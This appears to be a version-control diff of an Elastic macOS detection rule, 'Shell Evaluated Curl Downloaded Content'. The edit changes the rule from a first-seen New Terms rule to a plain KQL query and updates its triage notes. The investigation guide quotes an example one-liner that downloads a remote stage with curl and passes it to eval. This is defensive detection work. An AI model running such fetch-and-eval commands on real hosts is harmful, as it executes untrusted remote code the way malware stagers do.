@@ -2,26 +2,25 @@
 creation_date = "2026/11/09"
 integration = ["endpoint"]
 maturity = "production"
-updated_date = "2026/11/09"
+updated_date = "2026/11/10"
 
 [rule]
 author = ["Elastic"]
 description = """
-Detects the first time a parent process on a given host launches a shell that downloads content with curl and passes it
-to eval, either directly or through a variable assignment. Downloading a script and evaluating it in memory avoids
-writing the payload to disk and is commonly used by macOS loaders, adware and infostealer stagers to retrieve and run
-their next stage.
+Detects a shell that downloads content with curl and passes it to eval, either directly or through a variable
+assignment. Downloading a script and evaluating it in memory avoids writing the payload to disk and is commonly used
+by macOS loaders, adware and infostealer stagers to retrieve and run their next stage.
 """
 from = "now-9m"
 index = ["logs-endpoint.events.process-*"]
 language = "kuery"
 license = "Elastic License v2"
-name = "First Time Shell Evaluated Curl Downloaded Content on Host"
+name = "Shell Evaluated Curl Downloaded Content"
 note = """## Triage and analysis
 
-### Investigating First Time Shell Evaluated Curl Downloaded Content on Host
+### Investigating Shell Evaluated Curl Downloaded Content
 
-Download-and-evaluate one-liners such as `x=$(curl -fsSL https://host/stage2); eval "$x"` fetch a remote script and run it directly in the shell's memory, leaving no payload on disk. macOS loaders and stagers (for example WizardUpdate/UpdateAgent, adware droppers and infostealer installers) use this pattern to pull their next stage. Developer tooling, AI coding agents and management agents also assign curl output to variables and evaluate shell content, so this rule uses the New Terms rule type to alert only the first time a given parent process does this on a host within a 7-day window.
+Download-and-evaluate one-liners such as `x=$(curl -fsSL https://host/stage2); eval "$x"` fetch a remote script and run it directly in the shell's memory, leaving no payload on disk. macOS loaders and stagers (for example WizardUpdate/UpdateAgent, adware droppers and infostealer installers) use this pattern to pull their next stage. Developer tooling, AI coding agents and management agents also assign curl output to variables and evaluate shell content. Common agent shell wrappers and vendor-signed MDM agents are excluded by the query.
 
 ### Possible investigation steps
 
@@ -35,7 +34,7 @@ Download-and-evaluate one-liners such as `x=$(curl -fsSL https://host/stage2); e
 
 - Internal administration or patching scripts may retrieve configuration with curl and evaluate it. Confirm the script source and URL, then add an exception for the specific parent executable or script path.
 - Developer tooling and AI coding agents may assign curl output to variables and evaluate shell content while testing APIs. Common agent shell wrappers and vendor-signed MDM agents are excluded by the query.
-- Installers that bootstrap themselves from a vendor URL may trigger the rule once per host. Validate the domain and add an exception for the vendor URL pattern if appropriate.
+- Installers that bootstrap themselves from a vendor URL may trigger the rule. Validate the domain and add an exception for the vendor URL pattern if appropriate.
 
 ### Response and remediation
 
@@ -58,11 +57,11 @@ tags = [
     "Tactic: Command and Control",
     "Data Source: Elastic Defend",
     "Resources: Investigation Guide",
-    "Rule Type: New Terms",
+    "Rule Type: Custom Query (KQL)",
     "Platform: macOS",
 ]
 timestamp_override = "event.ingested"
-type = "new_terms"
+type = "query"
 
 query = '''
 event.category:process and host.os.type:macos and event.type:start and event.action:exec and
@@ -109,12 +108,3 @@ reference = "https://attack.mitre.org/techniques/T1105/"
 id = "TA0011"
 name = "Command and Control"
 reference = "https://attack.mitre.org/tactics/TA0011/"
-
-[rule.new_terms]
-field = "new_terms_fields"
-value = ["host.id", "process.parent.executable"]
-[[rule.new_terms.history_window_start]]
-field = "history_window_start"
-value = "now-7d"
-
-
